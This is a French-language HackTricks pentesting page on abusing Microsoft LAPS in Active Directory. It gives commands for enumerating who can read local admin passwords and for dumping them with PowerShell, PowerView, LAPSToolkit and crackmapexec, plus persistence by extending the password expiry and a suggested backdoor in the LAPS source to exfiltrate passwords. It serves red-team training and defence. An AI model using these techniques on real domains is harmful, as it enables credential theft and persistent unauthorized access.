# LAPS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Basic Information

La solution de mot de passe d'administrateur local (LAPS) est un outil utilisé pour gérer un système où les **mots de passe administrateurs**, qui sont **uniques, aléatoires et fréquemment changés**, sont appliqués aux ordinateurs joints au domaine. Ces mots de passe sont stockés en toute sécurité dans Active Directory et ne sont accessibles qu'aux utilisateurs qui ont reçu l'autorisation via des listes de contrôle d'accès (ACL). La sécurité des transmissions de mots de passe du client au serveur est assurée par l'utilisation de **Kerberos version 5** et de **Advanced Encryption Standard (AES)**.

Dans les objets d'ordinateur du domaine, la mise en œuvre de LAPS entraîne l'ajout de deux nouveaux attributs : **`ms-mcs-AdmPwd`** et **`ms-mcs-AdmPwdExpirationTime`**. Ces attributs stockent respectivement le **mot de passe administrateur en texte clair** et **son heure d'expiration**.

### Check if activated
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Accès au mot de passe LAPS

Vous pouvez **télécharger la politique LAPS brute** depuis `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` et ensuite utiliser **`Parse-PolFile`** du package [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) pour convertir ce fichier en un format lisible par l'homme.

De plus, les **cmdlets PowerShell LAPS natives** peuvent être utilisées si elles sont installées sur une machine à laquelle nous avons accès :
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** peut également être utilisé pour découvrir **qui peut lire le mot de passe et le lire** :
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Le [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilite l'énumération de LAPS avec plusieurs fonctions.\
L'une consiste à analyser **`ExtendedRights`** pour **tous les ordinateurs avec LAPS activé.** Cela montrera les **groupes** spécifiquement **délégués pour lire les mots de passe LAPS**, qui sont souvent des utilisateurs dans des groupes protégés.\
Un **compte** qui a **joint un ordinateur** à un domaine reçoit `All Extended Rights` sur cet hôte, et ce droit donne au **compte** la capacité de **lire les mots de passe**. L'énumération peut montrer un compte utilisateur qui peut lire le mot de passe LAPS sur un hôte. Cela peut nous aider à **cibler des utilisateurs AD spécifiques** qui peuvent lire les mots de passe LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**
Si l'accès à un powershell n'est pas disponible, vous pouvez abuser de ce privilège à distance via LDAP en utilisant
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Cela va extraire tous les mots de passe que l'utilisateur peut lire, vous permettant d'obtenir une meilleure prise avec un utilisateur différent.

## **Persistance LAPS**

### **Date d'expiration**

Une fois administrateur, il est possible d'**obtenir les mots de passe** et de **prévenir** une machine de **mettre à jour** son **mot de passe** en **définissant la date d'expiration dans le futur**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Le mot de passe sera toujours réinitialisé si un **admin** utilise la **`Reset-AdmPwdPassword`** cmdlet ; ou si **Ne pas autoriser une durée d'expiration de mot de passe plus longue que celle requise par la politique** est activé dans le GPO LAPS.
{% endhint %}

### Backdoor

Le code source original de LAPS peut être trouvé [ici](https://github.com/GreyCorbel/admpwd), il est donc possible d'ajouter une backdoor dans le code (dans la méthode `Get-AdmPwdPassword` dans `Main/AdmPwd.PS/Main.cs` par exemple) qui **exfiltrera de nouveaux mots de passe ou les stockera quelque part**.

Ensuite, il suffit de compiler le nouveau `AdmPwd.PS.dll` et de le télécharger sur la machine dans `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (et de changer l'heure de modification).

## References
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
